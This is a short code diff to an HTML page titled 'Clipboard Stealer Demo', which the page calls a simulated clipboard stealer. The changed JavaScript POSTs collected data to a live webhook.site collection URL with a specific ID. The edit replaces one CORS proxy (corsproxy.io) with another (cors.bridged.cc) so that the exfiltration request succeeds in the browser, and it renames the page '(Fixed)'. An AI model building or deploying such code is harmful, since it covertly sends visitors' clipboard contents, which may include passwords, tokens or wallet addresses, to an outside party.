@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Clipboard Stealer Demo (CORS Proxy)</title>
+  <title>Clipboard Stealer Demo (Fixed)</title>
 </head>
 <body>
   <h1>🚨 Simulated Clipboard Stealer</h1>
@@ -23,7 +23,9 @@
           timestamp: new Date().toISOString()
         };
 
-        const webhookURL = "https://corsproxy.io/?https://webhook.site/ed442c85-933a-4da3-987c-14d277c4d8e1"; // Replace with your full ID
+        const realWebhook = "https://webhook.site/ed442c85-933a-4da3-987c-14d277c4d8e1"; // Replace if needed
+        const proxy = "https://cors.bridged.cc/";
+        const webhookURL = proxy + realWebhook;
 
         const response = await fetch(webhookURL, {
           method: "POST",
